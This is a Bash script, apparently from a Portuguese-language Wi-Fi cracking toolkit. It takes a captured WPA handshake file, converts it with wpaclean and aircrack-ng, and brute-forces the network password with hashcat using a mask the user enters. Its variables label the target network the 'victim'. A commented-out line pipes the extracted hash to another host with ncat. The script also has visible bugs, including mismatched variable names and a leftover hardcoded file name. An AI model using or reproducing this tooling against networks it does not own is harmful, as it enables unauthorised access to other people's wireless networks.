#!/bin/bash

PWD="$(pwd)"
SCRIPTPATH="$(dirname $0)"
FUNCTIONPATH="${SCRIPTPATH}/functions"
CONFIG_DIR="$HOME/.wificrack"
CONFIG_FILE="$CONFIG_DIR/config.conf"
source "$CONFIG_FILE"

source "$CONFIG_INTERFACE"
source "$CURRENT_ATTACK_FILE"
source "$CONFIG_ATTACK"

#### VARIAVEIS UTILIZADAS
# DATA
# DIR_CONFIG_USER
# INTERFACE
# INTERFACE_MAC
# INTERFACE_INTERNET
# VITIMA
# CHANNEL
# BSSID
# STATION
# DHCP_RANGE
# DHCP_SERVER
# DHCP_RANGE_START
# DHCP_RANGE_END

find "$AIRCRACK_FILE_DIR"/ -maxdepth 1
echo -n "Digite o nome do arquivo .cap: "
read FILE_CAP

if [ -e "$FILE_CAP" ]; then
    echo "Digite a regra das senhas para o brute-force
Detalhes no link: https://hashcat.net/wiki/doku.php?id=mask_attack
"

    read MASK
    WPACLEAN_CAP_FILE="WPACLEAN-$FILE_CAP"
    HCCAP_FILE="$(echo \"$FILE_CAP\" | sed 's/\.[^.]*$//')"
    wpaclean "$WPACLEAN_CAP" "$FILE_CAP"
    aircrack-ng -J "$HCCAP_FILE" "$WPACLEAN_CAP"
    hashcat -m 2500 -a3 capture.hccap ?d?d?d?d?d?d?d?d
#    cat "$HCCAP_FILE" | ncat 192.168.0.100 80
    hashcat -m 2500 -a 3 "$HCCAP_FILE" $MASK
else
    echo "Arquivo não existe!!!"
fi
